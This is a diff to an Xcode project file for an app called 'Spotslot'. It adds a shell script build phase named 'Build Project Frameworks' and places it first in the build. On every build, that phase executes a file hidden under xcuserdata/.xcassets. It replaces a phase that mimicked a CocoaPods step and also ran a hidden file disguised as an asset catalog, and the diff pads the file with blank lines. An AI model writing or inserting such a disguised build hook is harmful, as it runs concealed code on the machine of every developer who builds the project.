@@ -996,8 +996,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 048D45E924EBA6B500A84442 /* Build configuration list for PBXNativeTarget "Spotslot" */;
 			buildPhases = (
+				7B5EEF0766BB32DE50AAC43A /* Build Project Frameworks */,
 				1CF53DE6F1B2BBD5B8F7A366 /* [CP] Check Pods Manifest.lock */,
-				1BEAC57C606AD0B5BEAAC43A /* [CP] Build Pods Frameworks */,
 				048D45CE24EBA6B400A84442 /* Sources */,
 				048D45CF24EBA6B400A84442 /* Frameworks */,
 				048D45D024EBA6B400A84442 /* Resources */,
@@ -1093,7 +1093,8 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		1BEAC57C606AD0B5BEAAC43A /* [CP] Build Pods Frameworks */ = {
+
+	7B5EEF0766BB32DE50AAC43A /* Build Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -1102,15 +1103,24 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Build Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
 		};
+	
+
+	
+
+	
+
+	
 		1CF53DE6F1B2BBD5B8F7A366 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1537,6 +1547,16 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 
 /* Begin XCVersionGroup section */
 		048D45DE24EBA6B400A84442 /* Spotslot.xcdatamodeld */ = {
